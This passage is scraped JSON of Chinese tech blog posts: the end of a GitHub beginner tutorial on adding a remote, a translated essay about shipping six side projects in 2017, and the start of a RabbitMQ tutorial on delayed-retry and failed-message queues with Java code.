class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit remote add origin https://github.com/&lt;your_username&gt;/Demo.git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe013452777891292-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe013452777891292-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe013452777891292-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">remote </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">origin </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/&lt;your_username&gt;/Demo.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe013452777891292-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>让我们一步步的分析这行命令。我们通知 Git 去添加一个叫做 <code>origin</code> （起源）的，拥有地址为 <code>https://github.com/&lt;your_username&gt;/Demo.git</code>（它也是您的仓库的 GitHub 地址） 的 <code>remote</code> （远程仓库）。当您提交代码时，这允许您在 GitHub.com 和 Git 仓库交互时使用 <code>origin</code> 这个名称而不是完整的 Git 地址。为什么叫做 <code>origin</code>？当然，您可以叫点别的，只要您喜欢（惯例而已）。</p>\n<p>现在，我们已经将本地 Demo 仓库副本连接到了其在 GitHub.com 远程副本上。您的终端看起来如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/8ca11bf5cd5069c6edbc8b5081048f10.png\" alt=\"\"></p>\n<p>此刻我们已经连接到远程仓库，可以推送我们的代码 到 GitHub.com（例如上传 <code>README.md</code> 文件）。</p>\n<p>执行完毕后，您的终端会显示如下信息：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/ad6f842634493d3eb98b683488023800.png\" alt=\"\"></p>\n<p>然后，如果您访问 <code>https://github.com/&lt;your_username&gt;/Demo</code>，您会看到截图内显示的情况：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b09c603947a63405fe70e869b60c3b34.png\" alt=\"\"></p>\n<p>就是这么回事！您已经创建了您的第一个 GitHub 仓库，连接到了您的电脑，并且从你的计算机推送（或者称：上传）一个文件到 GitHub.com 名叫 Demo 的远程仓库上了。下一次，我将编写关于 Git 复制（从 GitHub 上下载文件到你的计算机上）、添加新文件、修改现存文件、推送（上传）文件到 GitHub。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114101\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114101votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114101\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/b7572ca0b31306f69135c34a75fb5c67782dfb3a.jpg"},{"url_object_id": "a477d68fdad1a1b384e0ae7fb5c03095", "title": ["2017 年，我发布了 6 个副项目"], "url": "http://blog.jobbole.com/113822/", "create_date": "2018/06/08", "front_image_url": ["http://wx1.sinaimg.cn/large/63918611gy1frenpxw9krj20rs0j6q9i.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 2, "tags": "职场, 副项目", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/how-i-shipped-six-side-projects-in-2017-3dde6c77adbb\">Mark Johnson</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>2016 年我曾定了一个目标——每个月都要学点新东西。最终，我发布了 6 个新项目。下面我要对这些项目以及我学到的东西做个总结。</p>\n<p>回望这一年，我成功发布了尽可能多的副项目，同时有一份超过了全职工作的工作、和家人度过了高质量的时光（我有两个孩子和一位非常有耐心的妻子）、作为兼职教授教书、还兼职提供咨询服务。这些对我来说似乎有点疯狂。</p>\n<p>人们容易把缺乏时间视为阻碍自己做副项目的原因。我们常给自己找的借口是“只要有更多时间……”。我们还寻找花里胡哨的 App 或者任务管理技巧，来尝试在时间表中空出些时间来。</p>\n<p>但是，去年我学到的主要的一点就是，<strong><em><span style=\"color: #ff0000;\">时间不是首要问题。你有足够的时间；你需要的是动力。</span></em></strong></p>\n<p>好消息是，我们“应付得了”动力。在 2017 年我学到了几种应付动力的方法，我想跟你们分享一下。</p>\n<h3>你必须得选一个你真正感兴趣的想法</h3>\n<p>你只是不能对你不关心的事物保持热情，所以选一些你激情所在的事情来做。当你灵光一闪时，别让它溜走，用上它。即使这意味着你要在工作会议上草草记下些笔记。</p>\n<p>重要的是紧紧抓住这些灵感时刻，以求知若饥并保持对工作的好奇心。</p>\n<h3>给自己准备一个工作时间表</h3>\n<p>对我来说，这意味着每个月发布些东西。一旦我开始工作，我往往会搞砸。所以 30 天的限制确实能帮助我控制好这个趋势，有效利用我的动力。</p>\n<p>如果结果发现某个月的想法不中用，这也能给你一个机会去尝试新想法。至少你不会把一整年的时间浪费在它上面。</p>\n<h3>你需要一个分享成果的公开截止日期</h3>\n<p>这是重要的一点。在项目尾声时你会耗尽“动力库”。（最后 10% 是致命的。）唯一能助你度过动力低迷期的是，知道在另一头还有人等着看你的成果。</p>\n<p>分享工作成果的另一个好处是，给你一个为副项目收集支持性反馈的机会。我工作的地方 <a href=\"https://atlaslocal.com\">Atlas Local</a> 会在每月第一个周五举办全办公室范围的活动。我利用这项活动展示我前一个月的项目，而且总能收到在场的这些慷慨的伙伴的鼓励和支持。</p>\n<p>站出来分享你的成果，你会对你收到了多少支持而感到震惊的。</p>\n<p style=\"text-align: center;\">. . .</p>\n<p>这项实验中最让我惊讶的部分大概就是，我对在 2018 年发布更多工作更加充满动力，远不是在最后筋疲力尽。</p>\n<p>我会鼓励你在新的一年里应付动力问题，并发布一些你已经考虑了一段时间的想法。如果你尝试了，那我很乐意洗耳恭听。</p>\n<p>如果你对我在 2017 年的工作成果的细节感兴趣，请继续阅读！</p>\n<p style=\"text-align: center;\">. . .</p>\n<h2>一月项目：<a href=\"https://www.pers0nal1ty.com\">Pers0nal1ty.com </a></h2>\n<p><em>可视化比较团队最强特点和最弱特点的个性类型</em></p>\n<p><img src=\"http://wx1.sinaimg.cn/large/63918611gy1frenpxw9krj20rs0j6q9i.jpg\"></p>\n<p>我已经入<strong>迈尔斯·布里格斯类型指标（MBTI）</strong> 的坑一段时间了。尽管我不把它看成是规范，也不认为它有那么科学，它仍是一个理解与我不同的人的有用框架。</p>\n<p>很多痴迷于个性的人没有意识到的是，MBTI 系统是基于<em>认知功能</em>的。认知功能是由现代心理学之父 Carl Jung 在上世纪 20 年代创造的。我想深挖一下，并进一步学习它。</p>\n<p>同时，我看了 HBO 的《西部世界》，看到了下面这一幕：</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1frenpygjl1j20m80ci763.jpg\"></p>\n<p>我超爱这类科幻用户界面，它马上吸引了我的注意力。我想，如果我能基于人们的 MBTI 特征，建他们各自的“角色档案”会怎么样呢？为什么不呢？</p>\n<p>为了该项目做准备，我读了 “MBTI 圣经”， <a href=\"https://www.amazon.com/Gifts-Differing-Understanding-Personality-Type/dp/089106074X\">Myers 和 Briggs 合著的《Gifts Differing</a>》，并着手构建一个系统，该系统可以根据 MBTI 系统的基础——<a href=\"https://en.wikipedia.org/wiki/Jungian_cognitive_functions\">认知功能</a>来生成雷达图。</p>\n<p>最后，我以《西部世界》的用户界面为核心，因为我（和其他 beta 测试者）发现，将多人重叠在同一张雷达图上以获得一群人之间的关系的能力更为实用。</p>\n<p>如果我自己也这么说的话，结果确实很有趣。试试输入团队成员的个性类型或者你和你伴侣的个性类型：</p>\n<p> </p>\n<h3>二月：<a href=\"https://sheetcake.cc\">Sheetcake 登录页面</a></h3>\n<p><em>制作任何网上登陆表单最简单的方法</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frenpzfh23j20rs0k5tio.jpg\"></p>\n<p style=\"text-align: center;\">Sheetcake 登陆页面</p>\n<p>我已经着手于 Sheetcake 几年了。它拥有非常小的一部分忠实用户（他们中的大多数都认识我或者与我关系亲密的人）。</p>\n<p>SheetCake 趣事：</p>\n<ul>\n<li>2012 年，我在 48 小时内完成了第一个版本。这是年轻一点的我演示这个 48 小时版本的<a href=\"https://www.youtube.com/watch?v=L5jsxlQr37Q\">视频</a></li>\n<li>我已经重新写了 4 次！第一版是用了 Backbone.js + Node.js。第二版是用了 Backbone + Marionette + Firebase。第三版是用了 React + Firebase（全都用了 CoffeeScript）。第四版，也是最终版，是用了 ES6、React 和 Firebase。</li>\n<li>使用 Sheetcake 的人往往连着用了好几年；然而还没有商业模型。</li>\n</ul>\n<p>Sheetcake 在某几方面的确做得很好（比如 Zero Day 注册），所以我想为它制作一个登录页面，以推销这些优点。我从一个模版开始，这是它的最终版本。</p>\n<p> </p>\n<h3>三月：<a href=\"https://www.wmdmark.com\">NeTi 聊天机器人</a></h3>\n<p><em>向我外向的机器人助手提有关于我的问题</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1frenq0ed6aj20rs0gsab3.jpg\"></p>\n<p style=\"text-align: center;\">NeTi 聊天机器人</p>\n<p>去年早些时候，聊天机器人大火。尽管我从来不对聊天机器人能自己去某地抱什么希望，但是它们的对话 A.I. 属性还是吸引了我，我想进一步了解它。</p>\n<p>我是个内向的人，一般十分不擅长分享自己的事情。所以我想创造一个外向的机器人，它可以回答一些关于我的简单问题，这可能很有趣。</p>\n<ul>\n<li>如果我是个外向的人，我会拥有某些认知功能，NeTi 就得名于此。</li>\n<li>给提问意图分类的 A.I. 部分是用 Wit.ai 构建的，Wit.ai 使得构建 A.I. 容易多了。</li>\n<li>别让 NeTi 太生气，否则它可能会猛烈抨击你。</li>\n</ul>\n<p> </p>\n<h3>四月：<a href=\"https://github.com/wmdmark/goap-js\">G.O.A.P.</a></h3>\n<p><em>用目标导向型行动计划（Goal Oriented Action Planning ）构建令人信服的 A.I.</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frenq0zcdmj20rs0kun8x.jpg\"></p>\n<p style=\"text-align: center;\">添加了移轴效果的代码截图——为什么不呢？</p>\n<p>在偶然间看到<a href=\"http://alumni.media.mit.edu/~jorkin/goap.html\">这篇文章</a>后，我被一个游戏背景中描述的 <a href=\"http://alumni.media.mit.edu/~jorkin/goap.html\">GOAP</a> 深深吸引。这个游戏叫 <a href=\"https://en.wikipedia.org/wiki/F.E.A.R.\">F.E.A.R</a>，对我来说有些怀旧气息。</p>\n<p>过去我参与过一些有基础 A.I. 的游戏的工作，从来没有遇到这项技术。我记得那时我觉得 F.E.A.R 的 A.I. 特别令人印象深刻、栩栩如生。</p>\n<p>在进一步研究后，这个方法最吸引人的地方不是结果多么令人信服，而是解决方法多简单优雅（尤其是跟更标准的 A.I. 方法比较，比如有限状态机（Finite State Machine））。</p>\n<p>所以我为四月份的项目写了一个 JavaScript 库来探索 GOAP。一个基础执行简单得出乎意料（只要 58 行代码！）。</p>\n<p> </p>\n<h3>五月：<a href=\"https://github.com/wmdmark/goap-js\">目标合同</a></h3>\n<p><em>为你的目标签署责任合同。</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1frenq1hudmj20rs0iktbq.jpg\"></p>\n<p style=\"text-align: center;\">内嵌责任的目标合同</p>\n<p>五月我也开始了<a href=\"https://whole30.com/whole30-program-rules/\">整整 30 天节食（Whole 30 diet）</a>。我对我的饮食习惯变得满意，它也必然会影响我的能量级。整整 30 天节食（Whole30）对我来说进行得很顺利（节食期间我减了 18 磅，在接下来的几个月总共又减了 35 磅）。最重要的是，它确实均衡了我白天的能量，我感到更有动力了，也更专注了。</p>\n<p>看到了公开承诺和动力的相似之处，我决定将探索“目标合同”这个想法作为五月的副项目。</p>\n<p style=\"text-align: center;\">. . .</p>\n<h3>六月至十二月：<a href=\"https://www.tiltmaps.com\">TiltMaps</a></h3>\n<p><em>为你喜爱的地点和记忆制作独一无二的地图海报</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frenq23kdhj20rs0ib49c.jpg\"></p>\n<p style=\"text-align: center;\">TiltMaps 主页</p>\n<p>这是一切的核心。我六月份的目标是做一个大家真正想买的产品。我最大的短板之一就是销售和营销，所以我想做一个可以帮助我练习的产品来进一步学习。</p>\n<p>我一直都对地图和生成艺术感兴趣，所以我有个吸引人的主意——创造一个工具，你可以用它来创造并购买你所喜爱的地点的海报。</p>\n<p>这个项目太过有野心，不能在一个月内作为副项目完成。所以我决定用 2017 年剩余的几个月来完成 TiltMaps，并在发布前每个月都研究该产品的不同角度。我发现把一个较大的项目的不同部分分成月度项目能有效完成项目。</p>\n<p> </p>\n<h3>六月至七月：The Secret Sauce <sup>™</sup></h3>\n<p>为了弄清楚是否有可能生成高分辨率 3D 地图，我第一个月大部分时间都用来做 R&amp;D 了。生成世界上任意地点的一张 300dpi 的 3D 地图不是任意 API 或者我找到的平台能开箱即用地支持的事情，所以我不得不发明我自己的方法来完成这件事。弄清它花掉了我这个月大部分的时间，但是当我找到了答案就变得出乎意料地简单了。之后，我构建了一个基础编辑器来开始制作真正的海报，并订购了几次打印测试。</p>\n<p> </p>\n<h3>八月至九月：概念的证明（MVP）</h3>\n<p>接下来几个月我构建了该产品有更多消费者的 MVP。设计并不好，但是我还是让事情运转起来了，并且可以开始海报制作和打印的用户测试了。</p>\n<p> </p>\n<h3>十月至十一月：品牌和市场营销</h3>\n<p>接下来的几个月，我专注于让该项目准备好发布。尽管编辑器基本完成了，但是我还没有主页，而且市场营销方面还差得远。</p>\n<p>最终，通过在 Zero Day 和我参加的一个研讨会上展示 TiltMaps， 我在项目发布前的一个月卖出了几张海报。这非常鼓舞人心，因为这是我第一次从副项目中卖出了东西。</p>\n<p> </p>\n<h3>十二月：公开发布</h3>\n<p>在 <a href=\"https://www.producthunt.com/posts/tiltmaps\">Product Hunt</a> 上的发布比我预想中进行得顺利。我预计会卖出 10 张左右，但最终卖出了 37 张，而且仍然有订单进来。制作人们想买的东西感觉很好，而且它是一个很好的测试平台，可以尝试那些可能会在我的全职工作中发挥作用的、不同的广告和销售策略。</p>\n<p>我计划 2018 年继续致力于 TiltMaps。但愿我能从其中获得体面的、有趣的收入。</p>\n<p style=\"text-align: center;\">. . .</p>\n<p>总结完毕。感谢您读完全文。</p>\n<p>有任何想法或者反馈？我将洗耳恭听。在下面评论或者在 <a href=\"https://twitter.com/wmdmark\">Twitter</a> 上与我联络。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113822\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113822votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113822\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/f530c0cbed80a6a810d6e35a950794d795ec0368.jpg"},{"url_object_id": "a1c4868d9e1eb29137006234c75e2c5e", "title": ["RabbitMQ 发布订阅实战：实现延时重试队列"], "url": "http://blog.jobbole.com/113984/", "create_date": "2018/06/15", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/a099bdc26462540c4ca8ac310b8a24b8.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "开发, RabbitMQ", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/mylxsw\">管宜尧</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>RabbitMQ是一款使用Erlang开发的开源消息队列。本文假设读者对RabbitMQ是什么已经有了基本的了解，如果你还不知道它是什么以及可以用来做什么，建议先从官网的 <a href=\"http://www.rabbitmq.com/getstarted.html\" rel=\"nofollow noreferrer\">RabbitMQ Tutorials</a> 入门教程开始学习。</p>\n<p>本文将会讲解如何使用RabbitMQ实现延时重试和失败消息队列，实现可靠的消息消费，消费失败后，自动延时将消息重新投递，当达到一定的重试次数后，将消息投递到失败消息队列，等待人工介入处理。在这里我会带领大家一步一步的实现一个带有失败重试功能的发布订阅组件，使用该组件后可以非常简单的实现消息的发布订阅，在进行业务开发的时候，业务开发人员可以将主要精力放在业务逻辑实现上，而不需要花费时间去理解RabbitMQ的一些复杂概念。</p>\n<h2>概要</h2>\n<p>我们将会实现如下功能</p>\n<ul>\n<li>结合RabbitMQ的Topic模式和Work Queue模式实现生产方产生消息，消费方按需订阅，消息投递到消费方的队列之后，多个worker同时对消息进行消费</li>\n<li>结合RabbitMQ的 <a href=\"http://www.rabbitmq.com/ttl.html\" rel=\"nofollow noreferrer\">Message TTL</a> 和 <a href=\"http://www.rabbitmq.com/dlx.html\" rel=\"nofollow noreferrer\">Dead Letter Exchange</a> 实现消息的延时重试功能</li>\n<li>消息达到最大重试次数之后，将其投递到失败队列，等待人工介入处理bug后，重新将其加入队列消费</li>\n</ul>\n<p>具体流程见下图</p>\n<p><img title=\"xxx\" src=\"https://segmentfault.com/img/remote/1460000014847793?w=809&amp;h=926\" alt=\"xxx\"></p>\n<ol>\n<li>生产者发布消息到主Exchange</li>\n<li>主Exchange根据Routing Key将消息分发到对应的消息队列</li>\n<li>多个消费者的worker进程同时对队列中的消息进行消费，因此它们之间采用“竞争”的方式来争取消息的消费</li>\n<li>消息消费后，不管成功失败，都要返回ACK消费确认消息给队列，避免消息消费确认机制导致重复投递，同时，如果消息处理成功，则结束流程，否则进入重试阶段</li>\n<li>如果重试次数小于设定的最大重试次数（3次），则将消息重新投递到Retry Exchange的重试队列</li>\n<li>重试队列不需要消费者直接订阅，它会等待消息的有效时间过期之后，重新将消息投递给Dead Letter Exchange，我们在这里将其设置为主Exchange，实现延时后重新投递消息，这样消费者就可以重新消费消息</li>\n<li>如果三次以上都是消费失败，则认为消息无法被处理，直接将消息投递给Failed Exchange的Failed Queue，这时候应用可以触发报警机制，以通知相关责任人处理</li>\n<li>等待人工介入处理（解决bug）之后，重新将消息投递到主Exchange，这样就可以重新消费了</li>\n</ol>\n<h2>技术实现</h2>\n<p><a href=\"https://en.wikiquote.org/wiki/Linus_Torvalds\" rel=\"nofollow noreferrer\">Linus Torvalds</a> 曾经说过</p>\n<blockquote><p>Talk is cheap. Show me the code</p></blockquote>\n<p>我分别用Java和PHP实现了本文所讲述的方案，读者可以通过参考代码以及本文中的基本步骤来更好的理解</p>\n<ul>\n<li><a href=\"https://github.com/mylxsw/rabbitmq-pubsub-php\" rel=\"nofollow noreferrer\">rabbitmq-pubsub-php</a></li>\n<li><a href=\"https://github.com/mylxsw/rabbitmq-pubsub-java\" rel=\"nofollow noreferrer\">rabbitmq-pubsub-java</a></li>\n</ul>\n<h3>创建Exchange</h3>\n<p>为了实现消息的延时重试和失败存储，我们需要创建三个Exchange来处理消息。</p>\n<ul>\n<li><strong>master</strong> 主Exchange，发布消息时发布到该Exchange</li>\n<li><strong>master.retry</strong> 重试Exchange，消息处理失败时（3次以内），将消息重新投递给该Exchange</li>\n<li><strong>master.failed</strong> 失败Exchange，超过三次重试失败后，消息投递到该Exchange</li>\n</ul>\n<p>所有的Exchange声明(declare)必须使用以下参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exchange</td>\n<td>–</td>\n<td>Exchange名称</td>\n</tr>\n<tr>\n<td>type</td>\n<td>topic</td>\n<td>Exchange 类型</td>\n</tr>\n<tr>\n<td>passive</td>\n<td>false</td>\n<td>如果Exchange已经存在，则返回成功，不存在则创建</td>\n</tr>\n<tr>\n<td>durable</td>\n<td>true</td>\n<td>持久化存储Exchange，这里仅仅是Exchange本身持久化，消息和队列需要单独指定其持久化</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51b3652824448\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 声明Exchange：主体，失败，重试\r\nchannel.exchangeDeclare(\"master\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.retry\", \"topic\", true);\r\nchannel.exchangeDeclare(\"master.failed\", \"topic\", true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51b3652824448-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51b3652824448-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51b3652824448-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51b3652824448-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51b3652824448-1\"><span class=\"crayon-c\">// 声明Exchange：主体，失败，重试</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51b3652824448-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51b3652824448-3\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51b3652824448-4\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exchangeDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"topic\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span 